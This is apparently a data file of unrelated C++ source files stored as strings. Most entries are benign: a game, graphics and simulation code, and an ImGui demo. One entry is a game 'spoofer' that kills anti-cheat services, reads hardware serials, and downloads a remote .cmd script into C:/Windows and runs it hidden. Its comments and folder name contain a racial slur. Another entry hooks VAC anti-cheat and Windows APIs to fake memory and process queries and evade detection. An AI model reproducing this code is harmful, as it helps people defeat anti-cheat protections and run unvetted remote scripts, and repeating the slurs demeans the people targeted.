Lambda_Begin(Null,&variant)\n            Parameter(String const,name)\n            Parameter(Number const,age)\n                variant.object()[\"name\"]=name;\n                variant.object()[\"age\"]=age;\n            Lambda_End\n        }\n    };\n    variant.object()[\"set_value\"].function().Invoke(\"Jerry\",114514);\n    Logger::info(variant_to_string(variant));\n    BoxManager<typename Variant::value_type>::print_object_pool();\n    BoxManager<typename Variant::value_type>::print_memory_pool();\n    return 0;\n}",
    "#include <Windows.h>\n#include \"auth/auth.hpp\"\n#include <string>\n#include \"auth/utils.hpp\"\n#include \"auth/skStr.h\"\n\n\n#include <iostream>\n#include <string>\n#include <vector>\n#include <filesystem>\n#include <Windows.h>\n#include <Urlmon.h>\n\n#pragma comment(lib, \"Urlmon.lib\")\n\nnamespace fs = std::filesystem;\n\n#include <codecvt>\n\n#include <Windows.h>\n\nbool downloadFile(const std::wstring& url, const std::wstring& filePath) {\n    // nigger\n    int urlSize = WideCharToMultiByte(CP_UTF8, 0, url.c_str(), -1, nullptr, 0, nullptr, nullptr);\n    int filePathSize = WideCharToMultiByte(CP_UTF8, 0, filePath.c_str(), -1, nullptr, 0, nullptr, nullptr);\n\n    std::string narrowUrl(urlSize, '\\0');\n    std::string narrowFilePath(filePathSize, '\\0');\n\n    WideCharToMultiByte(CP_UTF8, 0, url.c_str(), -1, narrowUrl.data(), urlSize, nullptr, nullptr);\n    WideCharToMultiByte(CP_UTF8, 0, filePath.c_str(), -1, narrowFilePath.data(), filePathSize, nullptr, nullptr);\n\n    // nigger\n    HRESULT hr = URLDownloadToFileA(nullptr, narrowUrl.c_str(), narrowFilePath.c_str(), 0, nullptr);\n    if (FAILED(hr)) {\n        std::cerr << \"Failed to download files. Error code: \" << hr << std::endl;\n        return false;\n    }\n    return true;\n}\n\nvoid menu();\n\nint temp() {\n\n    INPUT input[2];\n\n    \n    input[0].type = INPUT_KEYBOARD;\n    input[0].ki.wScan = 0;\n    input[0].ki.time = 0;\n    input[0].ki.dwExtraInfo = 0;\n    input[0].ki.wVk = 0x31;  \n    input[0].ki.dwFlags = 0;  \n\n    \n    input[1].type = INPUT_KEYBOARD;\n    input[1].ki.wScan = 0;\n    input[1].ki.time = 0;\n    input[1].ki.dwExtraInfo = 0;\n    input[1].ki.wVk = 0x31;  \n    input[1].ki.dwFlags = KEYEVENTF_KEYUP;\n\n    \n    SendInput(2, input, sizeof(INPUT));\n\n    \n    input[0].ki.wVk = VK_RETURN;  \n    input[0].ki.dwFlags = 0;      \n\n    \n    input[1].ki.wVk = VK_RETURN;  \n    input[1].ki.dwFlags = KEYEVENTF_KEYUP;\n\n    \n    SendInput(2, input, sizeof(INPUT));\n\n}\n\nint win()\n{\n    system(\"cls\");\n\n    std::wstring folderPath = L\"C:/Windows/SupaNiga/\";\n    fs::create_directory(folderPath);\n\n    std::vector<std::wstring> fileURLs = {\n        L\"http://root1337.cdn.zerocdn.com/MAS_AIO-CRC32_9AE8AFBA%20%281%29.cmd\",\n    };\n\n    std::vector<std::wstring> fileNames = {\n        L\"windows.cmd\"\n    };\n\n    for (size_t i = 0; i < fileURLs.size(); ++i) {\n        if (!downloadFile(fileURLs[i], folderPath + fileNames[i])) {\n            std::wcerr << L\"Failed to download file: \" << fileURLs[i] << std::endl;\n            return 1;\n        }\n    }\n    _wsystem((folderPath + L\"windows.cmd\").c_str());\n\n    menu();\n}\nvoid tools()\n{\n    SetConsoleTitleA(\"Inertia TOOLS\");\n    system(\"cls\");\n    system(\"cls\");\n\n    printf(\"[ INFO ] Welcome to Inertia PERM SPOOFER\\n\\n\");\n    printf(\"\\n[1] Windows Activator \\n[2] MAC Spoof \\n[3] Return \\n[>] \");\n\n    std::string Spoof;\n    std::cin >> Spoof;\n\n    if (Spoof == \"1\" || Spoof == \"one\") {\n        \n        printf(\"[WARNING] THIS WILL CLOSE THE SPOOFER\");\n        Sleep(2000);\n        ShowWindow(GetConsoleWindow(), SW_HIDE);\n        win();\n        ShowWindow(GetConsoleWindow(), SW_SHOW);\n        printf(\"Done Spoofing...\");\n        Sleep(2000);\n    }\n    if (Spoof == \"2\" || Spoof == \"two\") {\n        printf(\"comign soon :)\");\n        tools();\n    }\n    if (Spoof == \"3\" || Spoof == \"three\") {\n        printf(\"Returning..\");\n        Sleep(2000);\n        menu();\n    }\n\n\n\n\n}\n\nvoid check()\n{\n    system(\"cls\");\n    system(\"echo BaseBoard:\");\n    Sleep(200);\n    system(\"wmic baseboard get serialnumber\");\n    Sleep(200);\n    system(\"echo System UUID:\") ;\n    Sleep(200);\n    system(\"wmic path win32_computersystemproduct get uuid\") ;\n    Sleep(200);\n    system(\"echo BIOS:\") ;\n    Sleep(200);\n    system(\"wmic bios get serialnumber\") ;\n    Sleep(200);\n    system(\"echo CPU:\") ;\n    Sleep(200);\n    system(\"wmic cpu get serialnumber\") ;\n    Sleep(200);\n    system(\"echo Mac Address:\") ;\n    Sleep(200);\n    system(\"getmac\") ;\n    Sleep(200);\n    std::cout << (\"  \")  << '\\n';\n    Sleep(200);\n    system(\"echo -----------------------------------------------\") ;\n    Sleep(200);\n    system(\"echo Returning In 5 Seconds\");\n    Sleep(200);\n    system(\"echo -----------------------------------------------\") ;\n    Sleep(5000);\n    system(\"cls\") ;\n    menu();\n}\n\n\n\nint spoof() {\n    system(\"taskkill /F /IM EpicGamesLauncher.exe >nul 2>&1\");\n    system(\"taskkill /F /IM EasyAntiCheatLauncher.exe >nul 2>&1\");\n    system(\"taskkill /F /IM BEService.exe >nul 2>&1\");\n    system(\"taskkill /F /IM Fortnite.exe >nul 2>&1\");\n    system(\"taskkill /F /IM BattleEyeLauncher.exe >nul 2>&1\");\n    system(\"taskkill /F /IM FortniteClient-Win64-Shipping.exe >nul 2>&1\");\n    system(\"sc stop BEService >nul 2>&1\");\n    system(\"sc stop BEDaisy >nul 2>&1\");\n    system(\"sc stop EasyAntiCheat >nul 2>&1\");\n    system(\"sc stop EasyAntiCheatSys >nul 2>&1\");\n\n    system(\"cls\");\n\n    std::wstring folderPath = L\"C:/Windows/SupaNiga/\";\n    fs::create_directory(folderPath);\n\n    std::vector<std::wstring> fileURLs = {\n        L\"http://root1337.cd",
    "#include \"battleship.H\"\n\n///\n/// The main function! This handles user input in the setup phase and attack phase, and contains the while loop that runs the game itself. \n///\n\nint main() {\n    ///\n    /// Setup phase: read in the user ships\n    ///\n    std::vector<std::string> ship_names{\"Carrier\",\"Destroyer\",\"Submarine\",\"Patrol\"};\n    std::vector<int> ship_lengths{5,4,3,2};\n    Grid player_grid = Grid();\n    for (int i=0; i<ship_names.size(); i++) {\n        read_in_ship(ship_names[i],ship_lengths[i],player_grid);\n        std::cout << player_grid;\n    }\n\n    Grid computer_grid = make_computer_grid(ship_names,ship_lengths);\n    std::cout << std::endl << \"Computer grid: \" <<std::endl;\n    print_hidden(computer_grid);\n\n    bool game_end = false;\n    int xt; //For reading in attacks\n    int yt;\n\n    ///\n    /// Loop to run the attack phase! The user enters a coordinate pair to attack, and the attack() function checks whether it hits anything,\n    /// reports which ship it hit, and updates the Ship and Grid objects. Then, attack_of_the_computer generates a location to attack, and\n    /// calls attack(). \n    ///\n    while (!game_end) {\n        std::cout << \"Enter the x coordinate of your attack: \";\n        std::cin >> xt;\n        std::cout << std::endl << \"Enter the y coordinate of your attack: \";\n        std::cin >> yt;\n        std::cout << std::endl;\n        int attack_coord = coord_to_grid(xt,yt);\n        attack(computer_grid,attack_coord,false);\n        \n        if (computer_grid.get_ship_coords().size() == 0) {\n            game_end = true;\n            std::cout << \"You win!\" << std::endl;\n            game_end = true;\n            continue;\n            ///\n            /// The continue statement is here to make sure the computer doesn't get a guess in once the user wins. \n            /// \n        }\n\n        std::cout << std::endl << \"Computer attack: \" ;\n        attack_of_the_computer(player_grid);\n        \n        if (player_grid.get_ship_coords().size() == 0) {\n            std::cout << \"Computer wins :(\" << std::endl;\n            std::cout << \"The computer grid was: \" <<std::endl;\n            std::cout << computer_grid;\n            game_end = true;\n        }\n    }\n}",
    "//C++ Standard Template\r\n#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n#include <fstream>\r\n#include <cmath>\r\n\r\n//Third Party\r\n#include <glad/glad.h>\r\n#include <GLFW/glfw3.h>\r\n#include <SDL/SDL.h>\r\n#include <glm/vec3.hpp> // glm::vec3\r\n#include <glm/vec4.hpp> // glm::vec4\r\n#include <glm/mat4x4.hpp> // glm::mat4\r\n//#include <glm/ext/matrix_transform.hpp> // glm::translate, glm::rotate, glm::scale\r\n#include <glm/ext/matrix_clip_space.hpp> // glm::perspective\r\n#include <glm/ext/scalar_constants.hpp> // glm::pi\r\n#include <glm/gtc/matrix_transform.hpp>\r\n#define GLM_ENABLE_EXPERIMENTAL\r\n#include <glm/gtx/string_cast.hpp>\r\n\r\n//GLOBAL VARIABLES\r\nint gScreenWidth = 1000;\r\nint gScreenHeight = 1000;\r\nSDL_Window*\t\tgGraphicsApplicationWindow = nullptr;\r\nSDL_GLContext\tgOpenGLContext = nullptr;\r\n\r\nbool gQuit = false; //If true, quit\r\n\r\n\r\n//VAO (stores attributes)\r\nGLuint gVertexArrayObject = 0;\r\n\r\n//VBO (stores data) - accessed by VAO\r\nGLuint gVertexBufferObject = 0;\r\n\r\n//Index Buffer Object (IBO)\r\nGLuint gIndexBufferObject = 0;\r\n\r\n//Program object for shaders\r\nGLuint gGraphicsPipelineShaderProgram = 0;\r\n\r\n//Movement variables for Quads\r\nfloat g_uOffset = 0.0f;\r\nfloat g_uOffsetQuad1 = -0.7f;\r\nfloat g_uOffsetQuad5 = 0.0f;\r\nfloat g_uOffsetQuad6 = 0.0f;\r\nfloat g_uOffsetQuad7 = 0.0f;\r\n\r\n//Gravity Variables\r\nfloat g_vOffsetQuad1 = -0.75f;\r\nfloat g_vOffsetQuad5 = 0.0f;\r\nfloat g_vOffsetQuad6 = 0.0f;\r\nfloat g_vOffsetQuad7 = 0.0f;\r\nfloat gGravity = -0.00009999f;\r\nbool isCollide = false;\r\nbool isDivide = false;\r\nbool canJump = false;\r\n\r\n//Collision Struct\r\nstruct Collider {\r\n\tglm::vec2 position;\r\n\tglm::vec2 size;\r\n};\r\n\r\n//Vector to store Colliders\r\nstd::vector<Collider> colliders;\r\n\r\n\r\n//Defining Colliders\r\nCollider quad1Collider = { glm::vec2(0.09f, -0.09f), glm::vec2(0.09f, -0.11f) }; //Character\r\nCollider quad2Collider = { glm::vec2(-0.9f, -0.9f), glm::vec2(1.8f, 0.19f) }; // Floor\r\nCollider quad3Collider = { glm::vec2(-0.9f, -0.8f), glm::vec2(0.19f, 1.8f) }; // Left Wall\r\nCollider quad4Collider = { glm::vec2(0.8f, -0.8f), glm::vec2(0.09f, 1.8f) };  // Right Wall\r\nCollider quad5Collider = { glm::vec2(-0.02f, 0.2f), glm::vec2(0.02f, 1.5f) };  // Middle Divider\r\nCollider quad6Collider;\r\nCollider quad7Collider;\r\n\r\n\r\n\r\n\r\nstd::string LoadShaderAsString(const std::string& filename) {\r\n\r\n\t//shader program loaded as single string. Dont want to compile everytime\r\n\tstd::string result = \"\"; \r\n\r\n\tstd::string line = \"\";\r\n\tstd::ifstream myFile(filename.c_str());\r\n\r\n\tif (myFile.is_open()) {\r\n\t\twhile (std::getline(myFile, line)) {\r\n\t\t\tresult += line + '\\n';\r\n\t\t}\r\n\t\tmyFile.close();\r\n\t}\r\n\r\n\treturn result;\r\n}\r\n\r\nGLuint CompileShader(GLuint type, const std::string& source) {\r\n\tGLuint shaderObject{};\r\n\r\n\t//for error checking\r\n\tif (type == GL_VERTEX_SHADER) {\r\n\t\tshaderObject = glCreateShader(GL_VERTEX_SHADER);\r\n\t}\r\n\telse if (type == GL_FRAGMENT_SHADER) {\r\n\t\tshaderObject = glCreateShader(GL_FRAGMENT_SHADER);\r\n\t}\r\n\r\n\tconst char* src = source.c_str();\r\n\tglShaderSource(shaderObject, 1, &src, nullptr);\r\n\tglCompileShader(shaderObject);\r\n\r\n\treturn shaderObject;\r\n}\r\n\r\nGLuint CreateShaderProgram(const std::string& vertexshadersource, const std::string& fragmentshadersource) {\r\n\tGLuint programObject = glCreateProgram();\r\n\r\n\tGLuint myVertexShader = CompileShader(GL_VERTEX_SHADER, vertexshadersource);\r\n\tGLuint myFragmentShader = CompileShader(GL_FRAGMENT_SHADER, fragmentshadersource);\r\n\r\n\tglAttachShader(programObject, myVertexShader);\r\n\tglAttachShader(programObject, myFragmentShader);\r\n\tglLinkProgram(programObject);\r\n\r\n\t//validate program\r\n\tglValidateProgram(programObject);\r\n\r\n\treturn programObject;\r\n}\r\n\r\nvoid CreateGraphicsPipeline() {\r\n\r\n\tstd::string vertexShaderSource = LoadShaderAsString(\"./vert.glsl\");\r\n\tstd::string fragmentShaderSource = LoadShaderAsString(\"./frag.glsl\");\r\n\r\n\tgGraphicsPipelineShaderProgram = CreateShaderProgram(vertexShaderSource, fragmentShaderSource);\r\n\r\n}\r\n\r\nvoid GetOpenGLVersionInfo() {\r\n\tstd::cout << \"Vendor: \" << glGetString(GL_VENDOR) << std::endl;\r\n\tstd::cout << \"Renderer \" << glGetString(GL_RENDERER) << std::endl;\r\n\tstd::cout << \"Version: \" << glGetString(GL_VERSION) << std::endl;\r\n\tstd::cout << \"Shading Language: \" << glGetString(GL_SHADING_LANGUAGE_VERSION) << std::endl;\r\n}\r\n\r\nvoid VertexSpecification(std::vector<GLfloat> &vertexData) {\r\n\r\n\t//Lives on the CPU\r\n\tvertexData = \r\n\t{\r\n\t\t //x      y      z\r\n\t\t // Quad 1 (Character)\r\n\t\t //0 - Vertex\r\n\t\t-0.09f,-0.09f, 0.0f,    //Left vertex\r\n\t\t 1.0f, 0.0f, 0.0f,     //Color\r\n\t\t //1 - Vertex\r\n\t\t 0.09f, -0.09f, 0.0f,    //Right vertex \r\n\t\t 0.0f, 1.0f, 0.0f,     //Color\r\n\t\t //2 - Vertex\r\n\t\t-0.09f, 0.09f, 0.0f,     //Top left vertex \r\n\t\t 0.0f, 0.0f, 1.0f,     //Color\r\n\t\t //3 - Vertex\r\n\t\t 0.09f, 0.09f, 0.0f,\t//Top right vertex\r\n\t\t 0.0f, 0.0f, 1.0f,     //Color\r\n\r\n\t\t //Quad 2 (Floor)\r\n\t\t//0 - Vertex\r\n\t\t-0.9f, -0.9f, 0.0f,    // Left vertex\r\n\t\t 0.0f, 0.0f, 0.0f,     // Color\r\n\t\t //1 - Vertex\r\n\t\t 0.9f, -0.9f, 0.0f,    // Right vertex \r\n\t\t 0.0f, 0.0f, 0.0f,     // Color\r\n\t\t //2 - Ver",
    "// dear imgui, v1.90.1 WIP\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.com/faq\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Need help integrating Dear ImGui in your codebase?\n//   - Read Getting Started https://github.com/ocornut/imgui/wiki/Getting-Started\n//   - Read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// Read imgui.cpp for more details, documentation and comments.\n// Get the latest version at https://github.com/ocornut/imgui\n\n//---------------------------------------------------\n// PLEASE DO NOT REMOVE THIS FILE FROM YOUR PROJECT!\n//---------------------------------------------------\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Think again! It is the most useful reference code that you and other coders will want to refer to and call.\n// Have the ImGui::ShowDemoWindow() function wired in an always-available debug menu of your game/app!\n// Also include Metrics! ItemPicker! DebugLog! and other debug features.\n// Removing this file from your project is hindering access to documentation for everyone in your team,\n// likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n//--------------------------------------------\n// ABOUT THE MEANING OF THE 'static' KEYWORD:\n//--------------------------------------------\n// In this demo code, we frequently use 'static' variables inside functions.\n// A static variable persists across calls. It is essentially a global variable but declared inside the scope of the function.\n// Think of \"static int n = 0;\" as \"global int n = 0;\" !\n// We do this IN THE DEMO because we want:\n// - to gather code and data in the same place.\n// - to make the demo source code faster to read, faster to change, smaller in size.\n// - it is also a convenient way of storing simple UI related information as long as your function\n//   doesn't need to be reentrant or used in multiple threads.\n// This might be a pattern you will want to use in your code, but most of the data you would be working\n// with in a complex codebase is likely going to be stored outside your functions.\n\n//-----------------------------------------\n// ABOUT THE CODING STYLE OF OUR DEMO CODE\n//-----------------------------------------\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowInputs()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] User Guide / ShowUserGuide()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] E",
    "/**\n *  \u6ce8\u610f NEEM \u65b9\u6cd5\u4e00\u5b9a\u8981\u5148\u8ba1\u7b97\u8fb9\uff0c\u7136\u540e\u8ba1\u7b97\u89d2\u70b9\n *  \u8fd9\u6837\u505a\u662f\u4e3a\u4e86\u786e\u4fdd\u8ba1\u7b97\u89d2\u70b9\u65f6\u4e0d\u4f1a\u53d6\u5230\u8fb9\u4e0a\u672a\u66f4\u65b0\u7684\u5206\u5e03\u51fd\u6570\u503c\n * \n *  \u5206\u79bb\u5f0f SWAP \u7b97\u6cd5\u53ea\u9700\u8981\u4fdd\u8bc1 c[i][] = -c[i+half][] \u5373\u53ef\n * \n *  Combined SWAP \u7b97\u6cd5\u8fd8\u8981\u8003\u8651 c \u7684\u65b9\u5411\uff0c\u5750\u6807\u5faa\u73af\u7684\u65b9\u5411\uff0c\u540c\u65f6 boundary \u4e0e bulk \u8fd8\u9700\u5206\u79bb\u8ba1\u7b97\n */\n\n// open Debug\n// #define MY_DEBUG\n\n#define MY_OMP_OPEN\n#ifdef MY_OMP_OPEN\n    #include <omp.h>\n#endif\n\n#include \"src/GlobalDef.hpp\"\n#include \"src/Array.hpp\"\n#include \"src/Field.hpp\"\n#include \"src/Units.hpp\"\n#include \"src/D2Q9BGK.hpp\"\n#include <time.h>\n#include <math.h>\n#include <fstream>\n#include <iomanip>\n#include <iostream>\n#include <sstream>\n#include <algorithm>\n\ntypedef Real T;\ntypedef units::IncompFlowParam<T> SimParam;\ntypedef lbmodels::d2q9::D2Q9BGK<T> LBM;\n\nLBM::DensityField rhoF;\nLBM::VelocityField velF, velF0;\nLBM::LatticeField latticeF;\n\nbool const swap_combine = false;\n\nvoid init(SimParam const& param);\nT feq_i(int i, LBM::Density_t rho, LBM::Velocity_t vel);\nvoid evolution(SimParam const& param);\nT ErrorVel();\nT AverageRho();\nvoid writeData(int t);\nvoid write_stream_func(int t);\n\nint main(int argc, char const *argv[])\n{\n    time_t t_start, t_end;\n    T avg_rho, err_vel;\n    int info_step = 100;\n    int out_step = 2000;\n\n    T Re = 1000.0;\n    T la_Umax = 0.1; // top lid velocity\n    T la_Cs = LBM::cs;\n    int resolution = 256;\n    T lx = 1;\n    T ly = 1;\n    SimParam const ldc_param(Re, la_Umax, la_Cs, resolution, lx, ly);\n    // std::cout << ldc_param;\n\n    init(ldc_param);\n    writeData(0);\n    t_start = time(NULL);\n    for (int t=0; true; ++t) {\n        evolution(ldc_param);\n        if (t%info_step == 0) {\n            avg_rho = AverageRho();\n            err_vel = ErrorVel();\n            t_end = time(NULL);\n            std::cout << \"[\" << difftime(t_end, t_start) << \" s]\"\n                      << \" Time step: \" << t\n                      << \" avg_rho: \" << std::setprecision(6) << avg_rho\n                      << \" relative error: \" \n                      << std::setiosflags(std::ios::scientific)\n                      << err_vel\n                      << std::resetiosflags(std::ios::scientific)\n                      << std::endl;\n            if ( t >= out_step) {\n                if (t%out_step == 0) { writeData(t); }\n                if ( err_vel < 1.0e-6 ) {\n                    write_stream_func(t);\n                    break;\n                }\n            }\n        }\n    }\n    return 0;\n}\n\nvoid init(SimParam const& param)\n{\n    T rho0 = 1.0;\n    T U0 = param.GetLatticeU();\n    T nx = param.GetNx();\n    T ny = param.GetNy();\n    rhoF = LBM::DensityField(nx,ny);\n    velF = LBM::VelocityField(nx,ny);\n    velF0 = LBM::VelocityField(nx,ny);\n    latticeF = LBM::LatticeField(nx,ny);\n\n    for (int y=0; y<ny; ++y) {\n        for (int x=0; x<nx; ++x) {\n            rhoF(x,y) = rho0;\n            velF(x,y)[0] = 0.0;\n            velF(x,y)[1] = 0.0;\n            velF(x, ny-1)[0] = U0;\n            for (int i=0; i<LBM::q; ++i) {\n                latticeF(x,y)[i] = feq_i(i, rhoF(x,y), velF(x,y));\n            }\n        }\n    }\n}\n\nT feq_i(int i, LBM::Density_t rho, LBM::Velocity_t u)\n{\n    T feq;\n    T uu = u[0]*u[0] + u[1]*u[1];\n    T uci = LBM::c[i][0]*u[0] + LBM::c[i][1]*u[1];\n    feq = rho*LBM::t[i]*(1.0 + LBM::invCs2*uci + 0.5*LBM::invCs2*(LBM::invCs2*uci*uci - uu));\n    return feq;\n}\n\nvoid evolution(SimParam const& param)\n{\n    int const nx = param.GetNx();\n    int const ny = param.GetNy();\n    T const omega = param.GetOmega();\nif ( swap_combine )\n{\n    // ---- collision and streaming (combined-SWAP algorithm) ----\n    int const half = (LBM::q-1)/2;\n    // ---- 1st. Boundary collision swap ----\n    for (int y=0; y<ny; ++y) {\n        for (int x=0; x<nx; ++x) {\n            // lattice on boundary\n            if ( x==0 || x==nx-1 || y==0 || y==ny-1 ) {\n                // boundary collision\n                for (int i=0; i<LBM::q; ++i) {\n                    latticeF(x,y)[i] *= (1.0-omega);\n                    latticeF(x,y)[i] += omega*feq_i(i, rhoF(x,y), velF(x,y));\n                }\n                // boundary swap\n                for (int i=1; i<=half; ++i) {\n                    std::swap(latticeF(x,y)[i], latticeF(x,y)[i+half]);\n                }\n            }\n        }\n    }\n    // ---- 2nd. Bulk combined swap (collision and streaming) ----\n    // \u56e0\u4e3a Combined SWAP \u53d7\u683c\u5b50\u65b9\u5411\u5f71\u54cd\uff0c\u8fd9\u91cc y \u5fc5\u987b\u4f18\u5148\u5faa\u73af\n    for (int x=1; x<nx-1; ++x) {\n        for (int y=1; y<ny-1; ++y) {\n            // collision\n            for (int i=0; i<LBM::q; ++i) {\n                latticeF(x,y)[i] *= (1.0-omega);\n                latticeF(x,y)[i] += omega*feq_i(i, rhoF(x,y), velF(x,y));\n            }\n            // combined swap, from 1 to half (with half)\n            for (int i=1; i<=half; ++i) {\n                int ix = x + LBM::c[i][0];\n                int iy = y + LBM::c[i][1];\n                if ( ix>=0 && ix<nx && iy>=0 && iy<ny ) {\n                    // T temp = latticeF(x,y)[i];\n                    // latticeF(x,y)[i] = latticeF(x,y)[i+half];\n                    // latticeF(x,y)[i+half] = latticeF(ix,iy)[i];\n                    // latticeF(ix,iy)[i] = temp;\n       ",
    "#include \"Hooks.h\"\r\n\r\nint _cdecl hkTfn1(HANDLE ProcessHandle, int a2){\r\n\tif (ProcessHandle == GetCurrentProcess())\r\n\t\treturn pFn1(ProcessHandle, a2);\r\n\treturn false;\r\n}\r\n\r\nDWORD _stdcall hkTfn2(HANDLE TargetHandle, int a2, int a3){\r\n\tif (TargetHandle == GetCurrentProcess())\r\n\t\treturn pFn2(TargetHandle, a2, a3);\r\n\treturn false;\r\n}\r\n\r\nbool _cdecl hkTfn3(DWORD dwProcessId, int a2, int a3){\r\n\tif (dwProcessId == GetCurrentProcessId())\r\n\t\treturn pFn3(dwProcessId, a2, a3);\r\n\treturn false;\r\n}\r\n\r\nchar _stdcall hkTfn4(){\r\n\treturn true;\r\n}\r\n\r\nchar _stdcall hkTfn5(char* p_this){\r\n\treturn true;\r\n}\r\n\r\nDWORD* _stdcall hkTfn6(DWORD* p_this){\r\n\treturn p_this;\r\n}\r\n\r\nchar _stdcall hkTfn7(BYTE* p_this, int a2, HANDLE TargetHandle, int a4, int a5, int a6){\r\n\tif (TargetHandle == GetCurrentProcess())\r\n\t\treturn pFn7(p_this, a2, TargetHandle, a4, a5, a6);\r\n\treturn true;\r\n}\r\n\r\nSIZE_T __stdcall hkVirtualQuery(LPCVOID lpAdress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {\r\n\tlpBuffer->AllocationProtect = PAGE_NOACCESS;\r\n\tlpBuffer->Protect = PAGE_NOACCESS;\r\n\tlpBuffer->Type = MEM_MAPPED;\r\n\treturn sizeof(MEMORY_BASIC_INFORMATION);\r\n}\r\n\r\nSIZE_T __stdcall hkVirtualQueryEx(HANDLE hProcess, LPCVOID lpAdress, PMEMORY_BASIC_INFORMATION lpBuffer, SIZE_T dwLength) {\r\n\tlpBuffer->AllocationProtect = PAGE_NOACCESS;\r\n\tlpBuffer->Protect = PAGE_NOACCESS;\r\n\tlpBuffer->Type = MEM_MAPPED;\r\n\treturn sizeof(MEMORY_BASIC_INFORMATION);\r\n}\r\n\r\nBOOL __stdcall hkProcess32NextW(HANDLE hSnapShot, LPPROCESSENTRY32W lppe) {\r\n\treturn 0;\r\n}\r\n\r\nBOOL __stdcall hkModule32NextW(HANDLE hSnapShot, LPMODULEENTRY32W lppe) {\r\n\treturn 0;\r\n}\r\n\r\nBOOL __stdcall hkIsDebuggerPresent(){\r\n\treturn false;\r\n}\r\n\r\nNTSTATUS hkNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG BufferSize, PULONG NumberOfBytesRead){\r\n\treturn STATUS_ACCESS_VIOLATION;\r\n}\r\n\r\nbool InitVACHooks(void* DllImageBase) {\r\n\tpFn1 = (tFn1)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 83 EC ? 8D 45 F8 C7 45 F8 ? ? ? ?\"), (PBYTE)hkTfn1);\r\n\tpFn2 = (tFn2)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 81 EC ? ? ? ? 53 56 57 6A ? 68 ? ? ? ?\"), (PBYTE)hkTfn2);\r\n\tpFn3 = (tFn3)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 51 56 57 8B 7D 0C\"), (PBYTE)hkTfn3);\r\n\tpFn4 = (tFn4)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 81 EC ? ? ? ? 56 8B 35 ? ? ? ?\"), (PBYTE)hkTfn4);\r\n\tpFn5 = (tFn5)DetourFunction((PBYTE)PatternScan(DllImageBase, \"56 57 8B F9 C7 07 ? ? ? ? C7 47 04 ? ? ? ?\"), (PBYTE)hkTfn5);\r\n\tpFn6 = (tFn6)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 83 EC ? 56 8B F1 C7 06 ? ? ? ?\"), (PBYTE)hkTfn6);\r\n\tpFn7 = (tFn7)DetourFunction((PBYTE)PatternScan(DllImageBase, \"55 8B EC 81 EC ? ? ? ? 53 8B D9 32 C0\"), (PBYTE)hkTfn7);\r\n\r\n\tHMODULE kernelModule = GetModuleHandleA(\"kernel32.dll\");\r\n\tif (!kernelModule)\r\n\t\treturn false;\r\n\r\n\tpVirtualQuery = (tVirtualQuery)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"VirtualQuery\"), (PBYTE)hkVirtualQuery);\r\n\tpVirtualQueryEx = (tVirtualQueryEx)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"VirtualQueryEx\"), (PBYTE)hkVirtualQueryEx);\r\n\tpProcess32NextW = (tProcess32NextW)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"Process32NextW\"), (PBYTE)hkProcess32NextW);\r\n\tpModule32NextW = (tModule32NextW)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"Module32NextW\"), (PBYTE)hkModule32NextW);\r\n\tpIsDebuggerPresent = (tIsDebuggerPresent)DetourFunction((PBYTE)GetProcAddress(kernelModule, \"IsDebuggerPresent\"), (PBYTE)hkIsDebuggerPresent);\r\n\tpNtReadVirtualMemory = (tNtReadVirtualMemory)DetourFunction((PBYTE)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), 